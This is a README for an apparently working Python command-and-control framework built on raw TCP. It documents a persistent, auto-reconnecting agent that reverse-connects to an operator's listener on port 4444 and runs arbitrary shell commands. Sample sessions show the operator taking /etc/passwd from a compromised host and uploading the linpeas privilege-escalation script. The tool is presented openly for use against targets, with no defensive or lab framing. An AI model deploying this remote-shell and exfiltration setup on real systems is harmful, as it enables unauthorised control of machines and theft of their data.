# NC-C2 — Netcat-Style Command & Control Framework

A lightweight Python C2 framework built on raw TCP sockets — netcat-compatible, multi-session, with an interactive shell and file transfer over the same channel.

---

## Architecture

```
[ Agent (client.py) ]  ──reverse connect──▶  [ C2 Server (server.py) ]
                                                      │
                                               [ handler.py ]
                                          (session management + file transfer)
```

- **server.py** — C2 listener, manages multiple incoming agent sessions
- **client.py** — Agent, executes commands, persists with auto-reconnect
- **handler.py** — Per-session logic: interactive shell, upload/download

---

## Setup

No dependencies beyond the Python standard library.

```bash
git clone https://github.com/yourname/nc-c2
cd nc-c2
```

---

## Usage

### 1. Start the C2 server

```bash
python server.py
```

Default listens on `0.0.0.0:4444`. Edit `HOST`/`PORT` at the top of `server.py` to change.

### 2. Run the agent on target

```bash
# Uses defaults (127.0.0.1:4444)
python client.py

# Custom C2 host and port
python client.py 192.168.1.10 4444
```

The agent auto-reconnects every 10 seconds if the connection drops.

### 3. Manage sessions

```
[*] C2 server listening on 0.0.0.0:4444
[+] Agent [1] connected from 192.168.1.5:51234

> sessions

  ID    Address                OS
  -----  ----------------------  ------------
  1      192.168.1.5:51234       Linux

> interact 1

[*] Interacting with session [1] — 192.168.1.5
[*] Commands: upload <src> <dst> | download <src> | exit

agent[1]> whoami
root

agent[1]> uname -a
Linux kali 6.1.0-kali9-amd64 ...

agent[1]> download /etc/passwd
[+] Downloaded /etc/passwd → passwd (2847 bytes)

agent[1]> upload tools/linpeas.sh /tmp/linpeas.sh
[+] Uploaded 847KB → /tmp/linpeas.sh

agent[1]> exit
[*] Returning to main menu.

> kill 1
[+] Session 1 killed.
```

---

## Server Commands

| Command | Description |
|---|---|
| `sessions` | List all active agents |
| `interact <id>` | Open interactive shell with agent |
| `kill <id>` | Terminate an agent session |
| `exit` | Shut down the C2 server |

## Shell Commands (inside interact)

| Command | Description |
|---|---|
| `<any shell cmd>` | Execute on the remote agent |
| `download <remote_path>` | Pull file from agent to local |
| `upload <local> <remote>` | Push local file to agent |
| `exit` | Return to main C2 menu |

---

## Netcat Compatibility

The server speaks plain TCP — you can connect a raw netcat session for testing:

```bash
# Simulate an agent with netcat (Linux)
nc 127.0.0.1 4444
```

> Note: netcat sessions won't support the `<<END>>` delimiter protocol, so use `interact` with actual `client.py` agents for full functionality.
